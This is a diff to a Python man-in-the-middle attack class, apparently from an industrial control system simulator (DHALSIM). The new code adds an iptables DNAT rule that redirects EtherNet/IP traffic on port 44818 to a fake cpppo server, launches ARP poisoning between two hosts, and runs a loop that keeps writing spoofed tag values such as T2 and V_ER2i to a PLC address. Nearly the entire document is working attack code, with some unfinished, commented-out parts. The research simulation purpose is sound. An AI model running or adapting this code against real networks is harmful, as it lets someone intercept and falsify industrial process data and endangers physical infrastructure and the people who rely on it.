@@ -1,15 +1,23 @@
 import argparse
 import os
+import shlex
+import socket
+import subprocess
 import threading
 import ctypes
+import time
 from pathlib import Path
+from typing import List
 
 import fnfqueue
 from scapy.layers.inet import IP, TCP
+from scapy.packet import Raw
 
+from dhalsim.network_attacks.utilities import translate_float_to_payload, translate_payload_to_float
 from dhalsim.network_attacks.cip.cip import CIP
 from dhalsim.network_attacks.utilities import launch_arp_poison, restore_arp
 from synced_attack import SyncedAttack
+
 
 class MitmAttack(SyncedAttack):
     """
@@ -29,58 +37,75 @@ class MitmAttack(SyncedAttack):
         os.system('sysctl net.ipv4.ip_forward=1')
         self.queue = fnfqueue.Connection()
         self.state = 0
-        self.q = None
+        # self.q = None
         self.thread = None
         self.run_thread = False
 
     def setup(self):
         # Add the iptables rules
-        os.system('iptables -t mangle -A PREROUTING -p tcp -j NFQUEUE --queue-num 1')
+        # os.system('iptables -t nat -A POSTROUTING --destination 192.168.1.254 -j SNAT --to-source 192.168.1.1')
+        # os.system('iptables -t nat -A POSTROUTING --destination 10.0.1.1/24 -j SNAT --to-source 192.168.1.1')
+        # os.system('iptables -t nat -A POSTROUTING --destination 10.0.3.1/24 -j SNAT --to-source 192.168.1.1')
+        os.system(
+            'iptables -t nat -A PREROUTING -p tcp -d 192.168.1.1 --dport 44818 -j DNAT --to-destination 192.168.1.2:44818')
         os.system('iptables -A FORWARD -p icmp -j DROP')
         os.system('iptables -A INPUT -p icmp -j DROP')
         os.system('iptables -A OUTPUT -p icmp -j DROP')
 
-        launch_arp_poison("192.168.1.1", "192.168.1.254")
+        print("MITM 💻:", "ip:", socket.gethostbyname(socket.gethostname()))
 
-        try:
-            self.q = self.queue.bind(1)
-            self.q.set_mode(fnfqueue.MAX_PAYLOAD, fnfqueue.COPY_PACKET)
-        except PermissionError:
-            print("Permission Error. Am I running as root?")
+        cmd = shlex.split(
+            "/usr/bin/python2 -m cpppo.server.enip --print --address 192.168.1.2:44818 T2:1=REAL V_ER2i:1=REAL")
+        print("MITM 💻:", "server:", cmd)
+        self.server = subprocess.Popen(cmd, shell=False)
 
         self.run_thread = True
-        self.thread = threading.Thread(target=self.packet_thread_function)
+        self.tags = {
+            "T2": 0.1234500000,
+            "V_ER2i": 1
+        }
+        self.thread = threading.Thread(target=self.cpppo_thread)
         self.thread.start()
 
-    def packet_thread_function(self):
+        launch_arp_poison("192.168.1.1", "192.168.1.254")
+
+    def make_client_cmd(self) -> List[str]:
+        # cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--print', '--address',
+        #        str(self.intermediate_attack['local_ip'])]
+        #
+        # for tag in self.tags:
+        #     cmd.append(str(tag) + ':1=' + str(self.tags[tag]))
+
+        cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--print', '--address', '192.168.1.2',
+               'T2:1=0.1234500000000000', 'V_ER2i:1=1']
+
+        return cmd
+
+    def cpppo_thread(self):
+        cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--print', '--address', '192.168.1.2',
+               'T2:1=0.1234500000000000', 'V_ER2i:1=1']
         while self.run_thread:
+            print("MITM 💻:", "client:", cmd)
             try:
-                for packet in self.queue:
-                    # TODO The actual mitm stuff
-                    packet2 = IP(packet.payload)
-                    print("MITM 💻:", "Packet 📦:", "source:", packet2[IP].src.ljust(16), str(packet2[TCP].sport).ljust(6), "   destination:",
-                          packet2[IP].dst.ljust(16), str(packet2[TCP].dport).ljust(6), )
-
-                    packet.mangle()
-
-            except fnfqueue.BufferOverflowException:
-                print("Buffer Overflow in a MITM attack!")
+                client = subprocess.Popen(cmd, shell=False)
+                client.wait()
+            except Exception as error:
+                print('ERROR enip _send multiple: ', error)
+            time.sleep(0.05)
 
     def interrupt(self):
         if self.state == 1:
             self.teardown()
 
     def teardown(self):
+        restore_arp("192.168.1.1", "192.168.1.254")
+
         # Delete iptables rules
-        os.system('iptables -t mangle -D PREROUTING -p tcp -j NFQUEUE --queue-num 1')
         os.system('iptables -D FORWARD -p icmp -j DROP')
         os.system('iptables -D INPUT -p icmp -j DROP')
         os.system('iptables -D OUTPUT -p icmp -j DROP')
 
-        restore_arp("192.168.1.1", "192.168.1.254")
-
         self.run_thread = False
-        self.queue.close()
         self.thread.join()
 
     def attack_step(self):
@@ -89,9 +114,11 @@ class MitmAttack(SyncedAttack):
                 self.state = 1
                 self.setup()
         elif self.state == 1:
+
             if not self.intermediate_attack["start"] <= self.get_master_clock() <= self.intermediate_attack["end"]:
                 self.teardown()
                 self.state = 2
+        print("MITM 💻:", "state", self.state)
 
 
 def is_valid_file(parser_instance, arg):
